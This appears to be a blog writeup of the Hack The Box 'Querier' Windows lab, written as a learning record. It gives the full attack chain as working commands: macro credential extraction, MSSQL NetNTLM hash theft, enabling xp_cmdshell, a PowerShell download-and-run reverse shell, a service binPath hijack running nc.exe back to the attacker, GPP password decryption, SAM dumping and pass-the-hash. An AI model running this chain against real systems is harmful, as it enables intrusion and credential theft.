---
layout: post
title:  "Querier Writeup - Hack The Box"
date:   2025-09-27
desc: ""
keywords: "HTB,OSCP,OSEP,eCPPTv3,Windows,Active Directory,Macro Inspection,olevba,MSSQL Hash Stealing,MSSQL Abuse,Cached GPP Files"
categories: [HTB]
tags: [HTB,OSCP,OSEP,eCPPTv3,Windows,Active Directory,Macro Inspection,olevba,MSSQL Hash Stealing,MSSQL Abuse,Cached GPP Files]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/querier_writeup/Querier.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I continue with another excellent **Windows** machine to reinforce knowledge that I acquired on previous machines, but which always helps me not only to remember **commands**, **tools**, and **technologies**, but more importantly, the **Methodology** that I'm building and that will surely help me in the success of future labs or pentests. The **Querier** machine didn't take me too long, but it wasn't easy either. The fun was also a reward that I always find in machines with **Windows OS**. The community rated it as **Medium**, and this time I agree with the assessment, perhaps because I already knew most of the vulnerabilities, although exploiting them is something very different. I'm going to access my **[Hack The Box's](https://www.hackthebox.com){:target="_blank"}** account to spawn the box and start my writeup.

<br /><br />
<img src="{{ site.img_path }}/querier_writeup/Querier_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before starting the lab, it is important that connectivity to it is already established through the **VPN**, so with the `ping` I can send a trace to the target machine and verify that the packets reach their destination. Then, with the **[hack4u](https://hack4u.io/){:target="_blank"}** community tool, `whichSystem.py`, I also measure with a high degree of certainty the **OS** that the box has, thanks to the **TTL** value. Now I can begin the most important phase of a **Pentest**, the **Reconnaissance** phase, using the `nmap` tool. First, I list all the open ports and then, with the help of custom `nmap` scripts, I leak information about the services (and their versions) available on each port found.  Among all the information found, the most relevant is that I am dealing with an **Active Directory**, **Microsoft SQL Server** is accessible — although I still do not have valid credentials. To organize all the information a little, I always use the **[honze-net](https://github.com/honze-net/nmap-bootstrap-xsl){:target="_blank"}** stylesheet. This way, just by starting a local server with `php`, I can access all the information collected with `nmap` from my browser in a more elegant way (a great help for reports).

```bash
ping -c 2 10.10.10.125
whichSystem.py 10.10.10.125
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.125 -oG allPorts
nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.125 -oN targeted
cat targeted
# 1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017
# Target_Name: HTB
# NetBIOS_Domain_Name: HTB
# NetBIOS_Computer_Name: QUERIER
# DNS_Domain_Name: HTB.LOCAL
# DNS_Computer_Name: QUERIER.HTB.LOCAL
# DNS_Tree_Name: HTB.LOCAL
# Product_Version: 10.0.17763

nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.125 --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -oX targetedBootstrap

php -S 0.0.0.0:80
# http://127.0.0.1/targetedBootstrap
```

<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

My first task, whenever I'm faced with a **Windows** machine, is to use `crackmapexec` to obtain information from the **SMB** protocol (including **OS** information). The most interesting thing is that the protocol is **not signed**, which could make the system vulnerable to an **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**. The next thing I do is use the **RPC** protocol (port **135**) and try to access the system with `rpcclient`, but unfortunately I need valid credentials. With `smbclient` and `smbmap`, I have better luck, as I can access a shared resource (**Reports**) and download an **.xlsm** file, but I don't have the privilege to upload files to the **SMB server**. When I open the file, I see that it is empty and there are no hidden columns, but with file `exiftool` I succeed in finding metadata that may or may not be helpful later on.

> The core vulnerability of **SMB** to **[Relay attacks](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/){:target="_blank"}** stems from its authentication mechanism, especially when using **NTLM**. When a user seeks access to a shared resource, **SMB** initiates a connection and authenticates the **Active Directory** user. Attackers can seize this authentication attempt, relaying it to a different server to impersonate the user. The **lack** of SMB’s validation (via **SMB signing**) of the authentication request’s origin or destination allows attackers to exploit it for unauthorized access.

```bash
crackmapexec smb 10.10.10.125

rpcclient -U "" 10.10.10.125 -N
  enumdomusers
  enumdomgroups
  quit
smbclient -L 10.10.10.125 -N
smbmap -H 10.10.10.125 -u 'null' --no-banner
smbclient //10.10.10.125/Reports -N
  dir
echo 'oldboy was here' > test.txt
  put test.txt
# :(

xdg-open Currency\ Volume\ Report.xlsm
file Currency\ Volume\ Report.xlsm
exiftool Currency\ Volume\ Report.xlsm
# Creator                         : Luis
# Application                     : Microsoft Excel
```

<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm starting to run out of ideas, so I'm going to try using the **SecLists** dictionary to access **[MSSQL](https://learn.microsoft.com/en-us/sql/sql-server/what-is-sql-server?view=sql-server-ver17){:target="_blank"}** using some default credentials, but I can't get it to work after trying `impacket-mssqlclient` in different ways and with different combinations. Already somewhat tired and frustrated, I notice that the **.xlsm** file I found was empty. Perhaps with **[`olevba`](https://github.com/decalage2/oletools/wiki/olevba){:target="_blank"}** I can find some attached macros. After cloning the repository and installing the tool on my system, I learn how to use the program and am able to access the code of a macro that contains **[MSSQL](https://learn.microsoft.com/en-us/sql/sql-server/what-is-sql-server?view=sql-server-ver17){:target="_blank"}** access credentials as well as other interesting commands that it performs.

> **[Microsoft SQL Server](https://learn.microsoft.com/en-us/sql/sql-server/what-is-sql-server?view=sql-server-ver17){:target="_blank"}** is a relational database management system (**RDBMS**). Applications and tools connect to a **SQL Server** instance or database, and communicate using **Transact-SQL** (**T-SQL**).

> **sa Account**: The **sa** account's password is created by the user during the **SQL Server** installation if **"Mixed Mode"** authentication (which allows both **Windows** and **SQL Server** authentication) is chosen. If **"Windows Authentication Mode"** is selected, the **sa** account is typically disabled by default.

> **Windows Authentication**: **SQL Server** installations often rely on **Windows Authentication**, where users connect using their **Windows** credentials, and **SQL Server** trusts the authentication provided by the operating system. This is generally considered more secure.

> **[`olevba`](https://github.com/decalage2/oletools/wiki/olevba){:target="_blank"}** is a script to parse **OLE** and **OpenXML** files such as **MS Office documents** (e.g. **Word**, **Excel**), to detect **VBA Macros**, extract their source code in clear text, and detect security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware, anti-sandboxing and anti-virtualization techniques, and potential **IOCs** (IP addresses, URLs, executable filenames, etc). It also detects and decodes several common obfuscation methods including **Hex encoding**, **StrReverse**, **Base64**, **Dridex**, **VBA expressions**, and extracts IOCs from decoded strings. XLM/Excel 4 Macros are also supported in Excel and SLK files.

```bash
find /usr/share/SecLists \-name *mssql* 2>/dev/null
cat /usr/share/SecLists/Passwords/Default-Credentials/mssql-betterdefaultpasslist.txt

impacket-mssqlclient WORKGROUP/sa@10.10.10.125
impacket-mssqlclient WORKGROUP/sa:sa@10.10.10.125
impacket-mssqlclient WORKGROUP/sa:sa@10.10.10.125 -windows-auth

git clone https://github.com/decalage2/oletools
sudo python3 setup.py install
python3 olevba.py
python3 olevba.py ../../Currency\ Volume\ Report.xlsm
```

<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With `crackmapexec`, I confirm that the credentials I found with **[`olevba`](https://github.com/decalage2/oletools/wiki/olevba){:target="_blank"}** are valid but at the **WORKGROUP** level and not at the **AD** level, but they also do not allow me to connect via the **WinRM** protocol. I resort to `impacket-mssqlclient` again and try to connect to **[MSSQL](https://learn.microsoft.com/en-us/sql/sql-server/what-is-sql-server?view=sql-server-ver17){:target="_blank"}** with the credentials, and it allows me to do so. I can then enumerate the **RDBMS** to find out its **version** and **username**, but the account with which I succeeded in accessing it cannot execute commands or enable this capability because it does not have the necessary privileges. However, there is the possibility of trying to **[steal the NetNTLM hash](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html?highlight=mssql#steal-netntlm-hash--relay-attack){:target="_blank"}** of the **Windows** account (not the **[MSSQL](https://learn.microsoft.com/en-us/sql/sql-server/what-is-sql-server?view=sql-server-ver17){:target="_blank"}** user account) and using an offline tool to try to crack it. So I start an **SMB** server with `impacket-smbserver` and from the **[MSSQL](https://learn.microsoft.com/en-us/sql/sql-server/what-is-sql-server?view=sql-server-ver17){:target="_blank"}** session I try to access a resource on the server, thus succeeding in my goal. With `john`, I was able to obtain the password in plain text, and again with `crackmapexec`, I verified that they are real, but I still cannot access through **WinRM**.

```bash
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'P...6'
crackmapexec winrm 10.10.10.125 -u 'reporting' -p 'P...6'
rpcclient -U 'reporting%P...6' 10.10.10.125

crackmapexec smb 10.10.10.125 -u 'reporting' -p 'P...6'
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'P...6' -d WORKGROUP
impacket-mssqlclient WORKGROUP/reporting@10.10.10.125
impacket-mssqlclient WORKGROUP/reporting@10.10.10.125 -windows-auth
  select @@version;
  select user_name();
  xp_cmdshell "whoami";
  SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
  sp_configure 'show advanced options', '1
# User does not have permission to perform this action.           :(

impacket-smbserver smbFolder $(pwd) -smb2support
  xp_dirtree \\10.10.14.13\smbFolder\pwn3d
# :)

nvim hash
john -w=$(locate rockyou.txt)                                   # [Tab]
john -w=/usr/share/wordlists/rockyou.txt hash
crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'c...8'
crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'c...8' -d WORKGROUP
crackmapexec winrm 10.10.10.125 -u 'mssql-svc' -p 'c...8' -d WORKGROUP
```

<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I still can't access the machine, I'm going to try again to execute commands through **MSSQL** but using the newly found access credentials. I succeed in accessing it without any problems and also have the necessary privileges to enable the permissions and configurations required to execute commands. After making the necessary changes, I try to test the connectivity to my machine by sending a trace with `ping`, but I can't get it to work. Even so, I try to obtain a **Reverse Shell**, as there may be an **IPTable rule** or a **network-level firewall security policy** that is preventing me from performing certain actions. I use a **[Nishang](https://github.com/samratashok/nishang){:target="_blank"}** script to send a **reverse shell**, which I only need to adjust slightly so that once it is downloaded to the target machine, it is interpreted immediately. Then I start a local server with `python` so that the aforementioned script is accessible, I open a port waiting for a connection, and finally, from the **MSSQL** session, I execute the malicious command to download the script. This way, I catch the incoming **Reverse Shell** with `nc` on port **443**. I verify that both the **OS** and the **process** are **64-bit** and begin the system enumeration phase and also access the contents of the first flag. The first thing I find is that the account has the **SeImpersonatePrivilege** enabled, but given the **OS version**, it is very likely that it is not vulnerable to **RottenPotatoNG**.

```bash
impacket-mssqlclient WORKGROUP/mssql-svc@10.10.10.125 -windows-auth
  xp_cmdshell "whoami";
  SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

  sp_configure 'show advanced options', '1';
  RECONFIGURE;
  sp_configure 'xp_cmdshell', '1';
  RECONFIGURE;
  xp_cmdshell "whoami";

tcpdump -i tun0 icmp -n
  xp_cmdshell "ping 10.10.14.13";

cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 ./PS.ps1
nvim !$
cat ./PS.ps1 | tail -n 2
python3 -m http.server 80
rlwrap -cAr nc -nlvp 443
  xp_cmdshell "powershell IEX(New-Object Net.WebClient).downloadString(\"http://10.10.14.13/PS.ps1\")";

whoami
hostname
ipconfig
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
whoami /priv
# SeImpersonatePrivilege        Impersonate a client after authentication Enabled

whoami /all

SystemInfo
# OS Name:                   Microsoft Windows Server 2019 Standard           :(
# OS Version:                10.0.17763 N/A Build 17763
# System Type:               x64-based PC
```

<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Although from previous experience with engaged machines, I know that I'm likely to encounter problems when using **[Juicy Potato](https://github.com/ohpe/juicy-potato){:target="_blank"}**, a version of **RottenPotatoNG**, I'm still going to try this attack vector. After downloading it to my attacking machine, I transfer it to the target machine, run the malicious program, but when I try to inject a command to create a new account, I have problems with the **CLSID** value and, as I imagined, there are no **[Windows CLSID's](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md){:target="_blank"}** available for the **OS version** of this machine. After enumerating for a long time without finding much information and without much success, it's time to speed up the process a bit. To do this, I use the **[`PowerUp.ps1`](https://github.com/PowerShellMafia/PowerSploit){:target="_blank"}** script to help me find possible attack vectors for **Privilege Escalation**. Once I adjust the script, I transfer it to the machine, and it is interpreted immediately, In a matter of seconds, it gives me the results I need. The most interesting information it finds is that I have the ability to stop, start, and configure the **UsoSvc** service (which would allow me to inject a malicious command), but the script also finds the **Groups.xml** file with a password.

> **PowerSploit** is a collection of **Microsoft PowerShell modules** that can be used to aid penetration testers during all phases of an assessment. **PowerSploit** is comprised of modules and scripts.

> **PowerUp** aims to be a clearinghouse of **common Windows privilege escalation vectors** that rely on misconfigurations.

> **Attacker Machine**:

```bash
mv ~/Downloads/JuicyPotato.exe ./JP.exe
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
iwr -uri http://10.10.14.13/JP.exe -OutFile .\JP.exe
dir
.\JP.exe
.\JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user oldb0y oldb0y123!$ /add"
# COM -> recv failed with error: 10038      [Windows CLSID]
# Windows Server 2019  :(
```

> **Attacker Machine**:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1
nvim PowerUp.ps1
cat PowerUp.ps1 | tail -n 1
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
IEX(New-Object Net.WebClient).downloadString("http://10.10.14.13/PowerUp.ps1")
# ServiceName   : UsoSvc
# CanRestart    : True
# Passwords : {M...!}
# File      : C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
# Check     : Cached GPP Files
```

<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Thanks to **PayloadsAllTheThings**, I find the help I need to try to **[exploit the misconfiguration of the UsoSvc service](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/){:target="_blank"}** and attempt to execute a command. My idea is to transfer the `nc.exe` program (to obtain a **Reverse Shell**) to the victim machine, but I'm also going to perform an **[AppLockerBypass](https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md){:target="_blank"}** and save it in a path where I will have no problems executing it. The next step is to stop the **UsoSvc** service and modify its **binPath** so that when I restart it, `nc.exe` will run instead of the service. Unfortunately, after following all the steps, I don't achieve my goal, so the next thing I do is check with `crackmapexec` that the credentials I found are valid, but I'm out of luck there too.

> **Victime Machine**:

```cmd
sc.exe query usosvc
sc.exe stop usosvc
sc.exe query usosvc
```

> **Attacker Machine**:

```bash
locate nc.exe | grep -v al3j0
cp /usr/share/windows-resources/binaries/nc.exe .
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
cd C:\Windows\System32\spool\drivers\color
iwr -uri http://10.10.14.13/nc.exe -OutFile .\nc.exe
sc.exe config usosvc binPath="C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.13 443 -e cmd.exe"
sc.exe query usosvc
```

> **Attacker Machine**:

```bash
rlwrap -cAr nc -nlvp 443
```

> **Victime Machine**:

```cmd
sc.exe start usosvc
# [SC] StartService FAILED 1053:          :(
```

> **Attacker Machine**:

```bash
crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'M...!'
crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'M...!' -d WORKGROUP
```

<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since the password I found with `PowerUp.ps1` was in the XML file **Groups.xml** (which stores **Group Policy Preferences**), I probably use a proprietary tool to **[extract it from the CPassword attribute instance](https://www.netwrix.com/plaintext_passwords_sysvol_group_policy_preferences.html){:target="_blank"}**, which contains the encrypted password. To make sure the password is correct, I use `gpp-decrypt` and find a small variation at the end of the password, which is valid and allows me to access the system through the **WinRM** protocol. I can connect with `impacket-psexec` and access the last flag. I can also use the password to dump all the password hashes of the **AD** accounts with `crackmapexec` and perform a **PassTheHash Attack** with **[`pth-winexe`](https://www.kali.org/blog/passing-hash-remote-desktop/){:target="_blank"}** to access the system using the **Administrator** account hash. Interestingly, with `pth-winexe` I cannot perform the same attack, but with `wmiexec.py` I can. Finally, I have succeeded in engaging and completing the lab.

> **WinExec** is a built-in scripting function that executes a **Windows** command as if it was entered at the command prompt.

> **SmbExec.py** (**SmbExec**) is another post-exploitation utility from the **Impacket toolkit** that enables attackers to remotely execute command on a target system, making it a common tool for lateral movement within a network. Like **WmiExec**, **SmbExec** does not initiate a full interactive login session.

> **Victime Machine**:

```cmd
type "C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml"
```

> **Attacker Machine**:

```bash
gpp-decrypt 'CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ'
crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'M...!' -d WORKGROUP
crackmapexec winrm 10.10.10.125 -u 'Administrator' -p 'M...!' -d WORKGROUP

impacket-psexec WORKGROUP/Administrator@10.10.10.125 -target-ip 10.10.10.125

crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'M...!' --sam
crackmapexec smb 10.10.10.125 -u 'Administrator' -p 'M...!' -d WORKGROUP --sam

pth-winexe -U WORKGROUP/Administrator%a...e:2...b //10.10.10.125 cmd.exe

wmiexec.py WORKGROUP/Administrator%a...e:2...b@10.10.10.125 cmd.exe
wmiexec.py WORKGROUP/Administrator@10.10.10.125 cmd.exe -hashes :2...b

smbexec.py WORKGROUP/Administrator@10.10.10.125 -hashes :2...b
```

<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/querier_writeup/Querier_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another great machine from **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** that had me trapped from the start. Although I was already familiar with most of the vulnerabilities from previous machines, it is always challenging to find the right way to exploit them. The variety of tools you can use is also a challenge because some may not work or may produce inaccurate results, which can cast doubt on the attack vector, so it's advisable to use all the necessary tools to rule it out and look for another way. Fun is guaranteed with this type of machine, and with each one I face, I'm slowly improving the process of engaging boxes with **Windows OS**, so I just need to access my **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** account to kill the box and continue on my path to improving my skills as a future pentester.

<br /><br />
<img src="{{ site.img_path }}/querier_writeup/Querier_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
